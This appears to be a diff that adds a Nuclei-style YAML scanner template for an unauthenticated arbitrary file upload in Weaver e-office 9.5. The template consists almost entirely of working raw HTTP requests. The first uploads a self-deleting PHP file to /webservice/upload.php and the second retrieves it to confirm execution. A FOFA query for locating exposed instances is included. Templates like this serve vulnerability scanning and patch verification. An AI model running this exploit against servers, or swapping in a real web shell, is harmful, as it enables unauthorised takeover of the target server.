@@ -1,0 +1,52 @@
+
+id: weaver-E-Office-upload-upload
+
+info:
+  name: weaver-E-Office-upload-upload
+  author: p1z
+  severity: high
+  description: |
+    泛微e-office 9.5版本源文件/webservice/upload.php接口处存在任意文件上传漏洞，未经身份验证的恶意攻击者可以上传恶意文件，从而获取目标服务器的控制权限。
+  reference:
+    https://blog.csdn.net/qq_41904294/article/details/132254906
+  metadata:
+    fofa-query: app="泛微-EOffice"
+    hunter-query:
+    verified: true
+  tags: 2023,weaver,E-Office,upload
+
+requests:
+  - raw:
+      - |
+        POST /webservice/upload.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryakbyiukl
+        Accept-Encoding: gzip
+        Connection: close
+
+        ------WebKitFormBoundaryakbyiukl
+        Content-Disposition: form-data; name="file"; filename="a.php4"
+        Content-Type: application/octet-stream
+
+        <?php echo "hello world";unlink(__FILE__);?>
+        ------WebKitFormBoundaryakbyiukl--
+
+      - |
+        GET /attachment/{{replace(name,"*","/")}}.php4 HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        name: name
+        group: 1
+        regex:
+          - '([/*0-9a-zA-Z]+)\.php4$'
+        internal: true
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'hello world'
+
